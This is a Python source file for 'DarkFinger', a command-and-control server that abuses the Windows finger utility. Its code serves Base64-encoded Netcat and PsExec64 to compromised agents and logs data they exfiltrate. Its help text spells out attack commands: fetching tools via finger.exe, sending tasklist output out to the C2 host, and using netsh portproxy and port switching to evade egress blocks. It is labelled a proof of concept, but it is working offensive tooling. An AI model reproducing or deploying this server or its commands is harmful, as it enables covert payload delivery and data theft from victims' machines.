#MIT License

#Copyright (c) 2020 John Page (aka hyp3rlinx)

#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:

#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.

#Permission is also explicitly given for insertion in vulnerability databases and similar,
#provided that due credit is given to the author Copyright (c) 2020 John Page (aka hyp3rlinx).

import socket,sys,re,time,os,argparse
from subprocess import *
from subprocess import Popen, PIPE, STDOUT

#DarkFinger / Windows Finger TCPIP Command C2 Server (c)
#Downloader and Covert Data Tunneler
#By John Page (aka hyp3rlinx)
#ApparitionSec
#twitter.com/hyp3rlinx
#
#File Downloads must be Base64 encoded text-files.
#Agents can change the port DarkFinger listens on dynamically:
#E.g. set to listen on port 80
#C:\>finger.exe !80!@DarkFinger-Server
#When not using Port 79, we need a Portproxy to send Port 79 traffic outbound to the specified Port.  
#Also, when using Ports other than Port 79 (default) we issue queries first to the machine running the Agent E.g.
#C:\>finger.exe <Command>@<Local-Machines-IP>
#
#Agents can change the Download wait time, to try an ensure files are fully downloaded before closing connections.
#Default time sent by the DF-Agent.bat PoC script is set to 10 seconds when issuing Download commands.
#Changing wait time before closing the socket when downloading PsExec64.exe E.g.
#C:\>finger.exe ps%<Wait-Time-Secs>%@%<DarkFinger-Server>%
#==============================================================================================================
#
port = 79                                    #Default if the client unable to Portproxy, use port 80/443 if possible.
downloads_dir = "Darkfinger_Downloads"       #Directory containing the Base64 encoded files for download
nc64 = downloads_dir+"\\nc.txt"              #Base64 encoded Netcat 
psexec = downloads_dir+"\\ps.txt"            #Base64 encoded PsExec64
byte_sz = 4096                               #Socket recv 
allowed_ports = [22,43,53,79,80,443]         #Restrict to a few.

BANNER="""
    ____             __   _______                      
   / __ \____ ______/ /__/ ____(_)___  ____ ____  _____
  / / / / __ `/ ___/ //_/ /_  / / __ \/ __ `/ _ \/ ___/
 / /_/ / /_/ / /  / ,< / __/ / / / / / /_/ /  __/ /    
/_____/\__,_/_/  /_/|_/_/   /_/_/ /_/\__, /\___/_/     
                                    /____/         v1
                                    
                           Finger TCPIP Command C2 Server
                                             By hyp3rlinx
                                            ApparitionSec
"""

def remove_cert_info(f):
    try:
        r1 = open(f)
        lines = r1.readlines()
        lines = lines[1:]
        r1.close()
        w1 = open(f,'w')
        w1.writelines(lines)
        w1.close()

        r2 = open(f)
        lines2 = r2.readlines()
        lines2 = lines2[:-1]
        r2.close()
        w2 = open(f,'w')
        w2.writelines(lines2)
        w2.close()
    except Exception as e:
        print(str(e))
        exit()
    

def create_base64_files(file_conf):
    global downloads_dir
    if os.path.exists(file_conf):
        if os.stat(file_conf).st_size == 0:
            print("[!] Warn: Supplied conf file is empty, no downloads were specified!")
            exit()
    else:
        print("[!] Supplied conf file does not exist :(")
        exit()
    try:
        path=os.getcwd()
        if not os.path.exists(path+"\\"+downloads_dir):
            os.makedirs(downloads_dir)
        f=open(file_conf, "r")
        for x in f:  
            x = x.strip()
            if os.path.exists(path+"\\"+x):
                proc = Popen(["certutil.exe", "-encode", path+"\\"+x, path+"\\"+downloads_dir+"\\"+x[:2].lower()+".txt"],
                             stdout=PIPE, stderr=PIPE, shell=False)
                out, err = proc.communicate()
                if "ERROR_FILE_EXISTS" in str(out):
                    print("[!] Cannot encode " + x[:2]+".txt" + " as it already exists, delete it (-d flag) and try again :(")
                    exit()
                time.sleep(0.5)
                #Remove certificate info generated by Windows Certutil.
                if os.path.exists(path+"\\"+downloads_dir+"\\"+x[:2].lower()+".txt"):
                    remove_cert_info(path+"\\"+downloads_dir+"\\"+x[:2].lower()+".txt")
                    print("[+] Created " + x + " Base64 encoded text-file "+x[:2].lower()+".txt" +" for download.")
            else:
                print("[!] Warn: File specified in the conf file to Base64 encode ("+x+") does not exist!")
                exit()
        f.close()
    except Exception as e:
        print(str(e))


def delete_base64_files():
    global downloads_dir
    path=os.getcwd()
    if os.path.exists(path+"\\"+downloads_dir):
        try:
            filelist = [ f for f in os.listdir(path+"\\"+downloads_dir) if f.endswith(".txt") ]
            for f in filelist:
                os.remove(os.path.join(path+"\\"+downloads_dir, f))
        except Exception as e:
            print(str(e))
            exit()
    
def B64Exec(t):
    payload=""
    try:
        f=open(t, "r")
        for x in f:
            payload += x
        f.close()
    except Exception as e:
        pass
        print(str(e))
        return 9
    return payload


def finga_that_box(cmd, victim):
    cmd = cmd.rstrip()
    if cmd[:1] != ".":
        cmd = cmd[0:2]
    if cmd == "nc":
        print("[+] Serving Nc64.exe")
        sys.stdout.flush()
        return nc64
    if cmd == "ps":
        print("[+] Serving PsExec64.exe")
        sys.stdout.flush()
        return psexec
    if cmd[:1] == ".":
        print("[+] Exfil from: "+ victim[0] + " " +cmd[1:])
        sys.stdout.flush()
    return False


def fileppe_fingaz():
    global byte_sz, port, allowed_ports
    delay=1
    s = socket.socket()
    host = ""
    try:
        if port in allowed_ports:
            s.bind((host, port))
            s.listen(5)
        else:
            print("[!] Port disallowed, you can add it to the 'allowed_ports' list.")
            exit()
    except Exception as e:
        print(str(e))
        exit()
    print("[/] Listening port:", str(port))
    sys.stdout.flush()
    try:
        while True:
            conn, addr = s.accept()
            a = conn.recv(byte_sz).decode() #Py 2
            #Let agent change port dynamically
            try:
                if a[:1]=="!":
                    idx = a.rfind("!")
                    if idx != -1:
                        port = str(a[1:idx])
                        if int(port) in allowed_ports:
                            port = int(port)
                            time.sleep(1)
                            conn.close()
                            s.close()
                            fileppe_fingaz()
                        else:
                            print("[!] Disallowed port change request from: %s" % addr[0])
                                
                #Let agent set time to wait dynamically.
                if a[:1] != "." and a[:1] != "!":
                    if re.search(r'\d\d', a[2:4]):
                        delay=int(a[2:4])
                        print("[-] Agent set the delay to: %d" % delay)
                        sys.stdout.flush()
            except Exception as e:
                print(str(e))
                pass
            t = finga_that_box(a, addr)
            if t:
                exe = B64Exec(t)
                if exe == 9:
                    conn.close()
                    continue
                if exe:
                    try:
                        conn.sendall(exe.encode())
                        time.sleep(delay)
                        conn.close()
                        delay=1
                    except Exception as e:
                        pass
                        #print(str(e))
                        sys.stdout.flush()
            conn.close()
            delay=1
        s.close()
    except Exception as e:
        print(str(e))
        pass
    finally:
        s.close()
        fileppe_fingaz()


def about():
    print("[+] Darkfinger is a basic C2 server that processes Windows TCPIP Finger Commands.")
    print(" ")
    print("[+] File download requests require the first two chars (lowercase) for the file we want,")
    print("[+] plus the wait time, this trys to ensure a full transmit before close the connection.")
    print("[+] Download Ncat64.exe and wait 30-secs before closing the socket:")
    print("[+] finger.exe nc30@DarkFinger > tmp.txt")
    print(" ")
    print("[+] Exfil Windows Tasklist using the '.' character used as the DarkFinger exfil flag:")
    print("[+] cmd /c for /f \"tokens=1\" %i in ('tasklist') do finger .%i@DarkFinger-Server")
    print("[+]")
    print("[+] If Port 79 is blocked, use Windows Netsh Portproxy to reach allowed internet Ports.")
    print("[+] Dynamically change the port Darkfinger C2 listens on to port 80:")
    print("[+] finger.exe !80!@DarkFinger-Server")
    print(" ")
    print("[+] DarkFinger-Agent.bat script is the client side component to demonstrate capabilities.")
    print("[+] Note: This is just a basic PoC with no type of real security whatsoever.")
    print("[+] Disclaimer: Author not responsible for any misuse and or damages by using this software.")


def main(args):

    global port
    print(BANNER)
    
    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    if args.about:
        about()
        exit()

    if args.port:
        port = int(args.port)

    if args.conf and args.delete:
        delete_base64_files()

    if args.conf:
        create_base64_files(args.conf)
    else:
        print("[!] Warn: No Base64 files created for download!, add required -c flag.")
        exit()
        
    fileppe_fingaz()


def parse_args():
    parser.add_argument("-p", "--port", help="C2 Server Port",  nargs="?")
    parser.add_argument("-c", "--conf", help="Textfile of tools to Base64 encode for download.",  nargs="?")
    parser.add_argument("-d", "--delete", nargs="?", const="1", help="Delete previously created Base64 encoded files on startup, -c required.")
    parser.add_argument("-a", "--about", nargs="?", const="1", help="Darkfinger information")
    return parser.parse_args()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    main(parse_args())
